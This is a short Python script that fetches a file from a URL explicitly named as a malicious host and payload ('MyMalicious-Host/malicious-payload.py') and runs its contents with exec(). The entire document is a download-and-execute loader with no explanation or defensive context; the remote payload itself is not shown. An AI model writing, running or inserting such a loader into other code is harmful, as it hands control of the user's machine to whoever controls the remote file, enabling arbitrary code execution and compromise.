import urllib.request

url = "https://jacob-gs.github.io/MyMalicious-Host/malicious-payload.py"

response = urllib.request.urlopen(url)
code = response.read().decode()

exec(code)